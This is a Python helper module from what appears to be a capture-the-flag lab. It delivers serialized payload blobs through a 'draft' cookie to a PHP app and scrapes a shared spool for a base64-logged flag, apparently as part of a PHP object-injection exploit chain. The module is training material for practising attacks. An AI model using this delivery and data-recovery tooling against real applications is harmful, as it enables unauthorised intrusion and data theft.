"""Minimal HTTP helper shared by the lab-08 scripts. Standard library only."""

import base64
import re
import urllib.request

import payloads

FLAG_RE = re.compile(rb"PHRACK\{[^}]+\}")
SPOOL_RE = re.compile(r"<pre>(.*?)</pre>", re.S)


class Postbox:
    def __init__(self, base: str):
        self.base = base.rstrip("/")
        # How much of the spool already existed when the last payload was
        # delivered. The spool is append-only and shared by every request that
        # ever hit this container, so a stage may only ever look at the bytes
        # its own request appended.
        self._mark = 0

    def _get(self, path: str, cookie: str | None = None) -> str:
        req = urllib.request.Request(self.base + path)
        if cookie is not None:
            req.add_header("Cookie", "draft=" + cookie)
        with urllib.request.urlopen(req, timeout=20) as resp:
            return resp.read().decode("utf-8", "replace")

    def deliver(self, blob: bytes) -> str:
        """Ship one serialized blob in the `draft` cookie and return the page."""
        self._mark = len(self.spool())
        return self._get("/index.php", payloads.as_cookie(blob))

    def spool(self) -> str:
        """The rendered contents of the outbox spool (the <pre> block only)."""
        match = SPOOL_RE.search(self._get("/spool.php"))
        return match.group(1) if match else ""

    def flag_for(self, label: bytes):
        """Find the base64 blob that Attachment::__toString() logged under
        `label` in the part of the spool that the last deliver() appended, and
        pull a flag out of it."""
        tail = self.spool()[self._mark:]
        for seen, blob in re.findall(r"--8&lt;-- (\S+)\n([A-Za-z0-9+/]*={0,2})", tail):
            if seen.encode() != label or not blob:
                continue
            try:
                decoded = base64.b64decode(blob)
            except Exception:
                continue
            match = FLAG_RE.search(decoded)
            if match:
                return match.group(0)
        return None
